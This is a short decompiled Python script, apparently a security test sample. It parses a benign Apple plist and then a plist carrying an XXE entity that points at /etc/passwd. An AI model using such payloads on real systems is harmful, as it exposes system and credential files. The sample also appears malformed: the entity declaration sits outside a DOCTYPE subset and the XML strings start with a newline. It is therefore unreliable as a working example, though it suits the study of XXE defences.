# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 12_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 1200 bytes
import plistlib

def parse_plist(xml_string):
    """
    Parse a plist XML string into a Python object.
    """
    return plistlib.loads(xml_string.encode("utf-8"))


xml_string = '\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0">\n    <dict>\n        <key>name</key>\n        <string>John Doe</string>\n        <key> occupation</key>\n        <string>Developer</string>\n    </dict>\n</plist>\n'
data = parse_plist(xml_string)
print(data)
malicious_xml_string = '\n<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n<plist version="1.0">\n    <dict>\n        <key>name</key>\n        <string>&xxe;</string>\n    </dict>\n</plist>\n'
data = parse_plist(malicious_xml_string)
print(data)

# okay decompiling 12_1.pyc
